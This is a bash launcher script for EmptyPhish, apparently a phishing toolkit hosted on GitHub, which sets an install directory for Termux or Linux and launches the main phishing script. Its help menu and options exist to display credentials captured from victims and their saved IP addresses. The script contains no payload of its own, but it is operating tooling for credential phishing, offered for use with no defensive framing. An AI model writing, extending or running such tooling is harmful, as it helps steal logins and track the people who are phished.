#!/bin/bash

# https://github.com/evildevill/EmptyPhish

if [[ $(uname -o) == *'Android'* ]];then
	EMPTYPHISH_ROOT="/data/data/com.termux/files/usr/opt/emptyphish"
else
	export EMPTYPHISH_ROOT="/opt/emptyphish"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run EmptyPhish type \`emptyphish\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $EMPTYPHISH_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $EMPTYPHISH_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $EMPTYPHISH_ROOT
	bash ./emptyphish.sh
fi
